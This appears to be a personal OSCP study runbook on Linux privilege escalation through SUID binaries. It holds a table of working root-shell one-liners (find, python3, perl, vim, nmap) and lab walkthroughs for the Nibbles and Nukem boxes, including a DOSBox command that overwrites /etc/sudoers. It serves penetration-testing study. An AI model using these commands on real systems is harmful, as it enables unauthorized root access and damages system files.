---
tags: [oscp, privesc, linux, suid, runbook]
box_sources: [Nibbles, Nukem]
---

# PrivEsc Linux — SUID

*Find binaries with the SUID bit set. If the owner is root, running it may give you euid=0.*

---

## Enumerate

```bash
find / -perm -4000 -type f 2>/dev/null
```

Pipe to a file or grep for known exploitable binaries:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -E "find|bash|python|perl|ruby|nmap|vim|nano|less|more|man|cp|mv|tar|zip|awk|env|tee|wget|curl"
```

Then check [GTFOBins](https://gtfobins.github.io) for each result — filter by `SUID`.

---

## Common Wins

| Binary | Exploit | Notes |
|---|---|---|
| `/usr/bin/find` | `find . -exec /bin/bash -p \; -quit` | `-p` preserves euid. `-quit` stops after first match. |
| `/bin/bash` | `/bin/bash -p` | Direct. Rare to find bash itself SUID. |
| `/usr/bin/python3` | `python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'` | GTFOBins pattern. |
| `/usr/bin/perl` | `perl -e 'exec "/bin/bash -p"'` | GTFOBins pattern. |
| `/usr/bin/vim` | `vim -c ':!/bin/bash -p'` | Interactive — opens bash from vim. |
| `/usr/bin/cp` | Copy `/bin/bash` to `/tmp`, SUID it, run | Indirect — use cp to install a SUID shell. |
| `/usr/bin/nmap` (old) | `nmap --interactive` then `!sh` | Only nmap < 5.20. |

---

## Nibbles Example

```bash
# Enumerate
find / -perm -4000 -type f 2>/dev/null
# Found: /usr/bin/find

# Exploit
/usr/bin/find . -exec /bin/bash -p \; -quit
# bash-5.0#
id
# uid=106(postgres) gid=113(postgres) euid=0(root)
```

---

---

## DOSBox Example (Nukem)

DOSBox is a DOS emulator — not in GTFOBins SUID section. When SUID root, its `-c` flags run DOS commands with root file access. Use `mount` to map a Linux directory to a DOS drive letter, then write to files via DOS `echo` + redirection.

```bash
# Enumerate — dosbox shows up in find output
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/dosbox

# Exploit — write to /etc/sudoers
dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'
# ALSA audio errors are normal — no sound card, ignore
# Dosbox writes to /etc/sudoers as root

# Verify
sudo -n id
# uid=0(root) gid=0(root) groups=0(root)

# Root shell
sudo -n bash

# Cleanup — restore sudoers from pacman package (Arch Linux)
bsdtar -xOf /var/cache/pacman/pkg/sudo-1.9.3.p1-1-x86_64.pkg.tar.zst etc/sudoers > /etc/sudoers
```

**Key concept**: Any SUID-root binary that can write files can be leveraged to write to `/etc/sudoers` (or `/etc/passwd`). DOSBox's DOS `echo >` is the mechanism here. The `mount c /etc` maps /etc to C:, so `c:\sudoers` is `/etc/sudoers`.

**Cleanup**: DOSBox's `echo >` overwrites sudoers entirely — only the one line remains. Restore from the original package before leaving the box.

---

## Module Links

[[18. Linux Privilege Escalation]]

## External Resources

- [GTFOBins - SUID](https://gtfobins.github.io/#suid) — filter by SUID for any binary
- [HackTricks - SUID](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation#suid-and-sgid) — broader SUID enumeration and exploitation patterns
